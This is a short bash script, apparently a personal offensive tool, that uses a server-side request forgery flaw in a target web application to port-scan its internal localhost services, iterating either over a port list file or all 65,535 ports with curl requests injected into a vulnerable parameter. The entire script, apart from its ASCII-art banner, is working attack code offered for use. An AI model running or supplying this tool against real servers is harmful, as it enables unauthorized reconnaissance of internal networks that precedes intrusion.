#!/bin/bash

clear
echo""
echo -e "\033[1;32mWelcome to the SSRF -> Portscan\033[0m"
echo ""
echo ""
echo -e "\033[0;35m                 ^_________-----_____^"
echo "       ^____------           __      ----_^"
echo "^___----             ___------              \^"
echo "   ^----________        ----                 \^"
echo "        ^       -----__    |             _____)^"
echo "                    ^__-                /     \^"
echo "        ^_______-----    ___--          \    /)\^"
echo "  ^------_______      ---____            \__/  /^"
echo "               ^-----__    \ --    _          /\^"
echo "                      ^--__--__     \_____/   \_/\^"
echo "                              ^----|   /          |^"
echo "                                  ^|  |___________|^"
echo "                                  ^|  | ((_(_)| )_)^"
echo "                                  ^|  \_((_(_)|/(_)^"
echo "                                  ^\______________)^"
echo ""
echo -e " \033[1;31m Project created by Gutierre0x80 \033[0m"
echo "" 

if [ $# -ne 3 ]; then
        echo "How to use: ./Portscan.sh URL Directory+Vulnerable_Parameter --top-ports or --all-ports";
	exit 1;
	fi

if [ "$3" == "--top-ports" ]; then
        echo -e "\033[0;34m Top ports mode \033[0m";
	echo"";
	for i in $(cat list);do
        	echo "Testing port: $i"
        	curl $1$2=http://localhost:$i
	done
	echo "Scan Completed in Top Ports mode" 
	exit 1;

elif [ "$3" == "--all-ports" ]; then
        echo -e "\033[0;34m All ports mode \033[0m";
	echo "";
        for i in {1..65535};do
                echo "Testing port: $i"
                curl $1$2=http://localhost:$i
        done
	echo "Scan Completed in All Ports mode" 
	exit 1;

else
        echo "How to use: ./Portscan.sh URL Directory+Vulnerable_Parameter --top-ports or --all-ports";
        exit 1;
        fi
